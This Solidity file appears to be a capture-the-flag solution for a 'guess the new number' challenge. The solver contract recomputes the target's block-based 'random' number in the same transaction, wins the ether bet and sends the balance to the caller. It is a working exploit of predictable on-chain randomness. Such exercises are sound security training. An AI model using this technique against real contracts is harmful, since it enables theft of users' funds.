// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

interface IGuessTheNewNumberChallenge {
    function guess(uint8) external payable;

    function isComplete() external view returns (bool);
}

contract GuessTheNumberSolver {
    IGuessTheNewNumberChallenge public challengeContract;

    constructor (address challengeAddress) {
        challengeContract = IGuessTheNewNumberChallenge(challengeAddress);
    }

    function solve() external payable {
        require(address(this).balance >= 1 ether, "");
        
        bytes32 hash = keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp));
        uint256 number = uint256(hash);
        uint8 answer = uint8(number);
        
        challengeContract.guess{value:1 ether}(answer);
        
        require(challengeContract.isComplete(), "");

        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable{}
}